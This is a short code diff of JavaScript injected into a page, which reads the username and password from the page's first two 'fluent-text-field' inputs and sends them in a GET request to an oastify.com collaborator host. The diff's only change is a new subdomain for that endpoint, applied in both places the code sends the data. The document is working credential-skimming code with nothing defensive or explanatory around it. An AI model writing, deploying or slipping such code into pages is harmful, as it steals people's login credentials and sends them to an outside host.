@@ -20,7 +20,7 @@
         script.textContent = `
             function sendData(username, password) {
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
+                xhr.open('GET', 'https://w2zllzx9v3pnmkm94x4xg1d7myspgf44.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
                 xhr.send();
             }
             
@@ -28,7 +28,7 @@
                 var username = document.getElementsByTagName('fluent-text-field')[0].value;
                 var password = document.getElementsByTagName('fluent-text-field')[1].value;
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
+                xhr.open('GET', 'https://w2zllzx9v3pnmkm94x4xg1d7myspgf44.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
                 // Handle successful completion
                 xhr.onload = function() {
                     if (xhr.status >= 200 && xhr.status < 300) {
